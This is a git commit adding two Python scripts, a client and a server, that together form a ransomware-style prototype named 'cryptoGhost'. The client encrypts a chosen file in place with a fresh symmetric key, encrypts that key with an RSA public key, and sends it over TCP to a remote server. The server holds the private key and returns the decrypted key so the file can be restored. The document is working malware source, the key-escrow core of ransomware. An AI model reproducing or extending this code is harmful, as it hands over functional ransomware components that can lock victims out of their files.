2a75601a288ca6de2aaf9d01fbdd8842840dc58c
BDBYER <88253491+hasenberg41@users.noreply.github.com>
2022-09-23 21:55:25 +0300

    Add files via upload

---
+++ cryptoGhost.py
@@ -0,0 +1,72 @@
+from genericpath import exists
+import socket
+import sys
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import hashes
+from cryptography.fernet import Fernet
+
+# argv[1] - ip address of TCP Server
+# argv[2] - target file to encoding and decoding
+
+# Generate symmetric key
+symmetricKey = Fernet.generate_key()
+FernetInstance = Fernet(symmetricKey)
+targetfile = sys.argv[2]
+
+server_ip, server_port = sys.argv[1], 8000
+def sendEncryptedKey(e_key_filepath):
+    with socket.create_connection((server_ip, server_port)) as sock:
+        with open(e_key_filepath, "rb") as file:
+            sock.send(file.read())
+        return sock
+
+def decrypt_file(filepath, key):
+    f_instance = Fernet(key)
+    with open(filepath, "rb") as file:
+        decrypted_data = f_instance.decrypt(file.read())
+    
+    with open(filepath, "wb") as file:
+        file.write(decrypted_data)
+
+
+# Получение публичного ключа для ассиметричного шифрования
+public_key_path = "public_key.key"
+if exists(public_key_path):
+    with open("public_key.key", "rb") as key_file:
+        public_key = serialization.load_pem_public_key(
+            key_file.read(),
+            backend=default_backend()
+        )
+else:
+    print("public key dousn\'t exist")
+    quit()
+
+# Шифрование симметричного ключа ассиметричным, используя публичный ключ
+encryptedSymmetricKey = public_key.encrypt(
+    symmetricKey,
+    padding.OAEP(
+        mgf=padding.MGF1(algorithm=hashes.SHA256()),
+        algorithm=hashes.SHA256(),
+        label=None
+    )
+)
+
+# Write to the new or overrite existing file an encrypted symmetric key
+encrypted_filepath = "encryptedSymmertricKey.key"
+with open(encrypted_filepath, "wb") as key_file:
+    key_file.write(encryptedSymmetricKey)
+    
+# Encrypt the target file
+with open(targetfile, "rb") as file:
+    file_data = file.read()
+    encrypted_data = FernetInstance.encrypt(file_data)
+
+with open(targetfile, "wb") as file:
+    file.write(encrypted_data)
+
+socket = sendEncryptedKey(encrypted_filepath)
+decrypted_key = socket.recv(4056).strip()
+decrypt_file(targetfile, decrypted_key)
+quit()
---
+++ cryptoGhostServer.py
@@ -0,0 +1,43 @@
+import socketserver
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import hashes
+
+
+class ClientHandler(socketserver.BaseRequestHandler):
+    
+    def handle(self) -> None:
+        encrypted_key = self.request.recv(1024).strip()
+        print("Implement decryption of data " + encrypted_key)
+        
+        decrypted_key = self.decrypt(encrypted_key)
+        
+        self.request.sendall(decrypted_key)
+
+    def decrypt(self, encrypted_key):
+        with open("/home/tabake/Документы/keys/pub_priv_pair.key", "rb") as file:
+            private_key = serialization.load_pem_private_key(
+                file.read(),
+                password=None
+            )
+        
+        decrypted_key = private_key.decrypt(
+            encrypted_key,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
+        return decrypted_key
+
+
+if __name__ == "__main__":
+    HOST, PORT = "", 8000
+    client_handler = ClientHandler
+    tcp_server = socketserver.TCPServer((HOST, PORT), client_handler)
+    
+    try:
+        tcp_server.serve_forever()
+    except:
+        print("There was error")
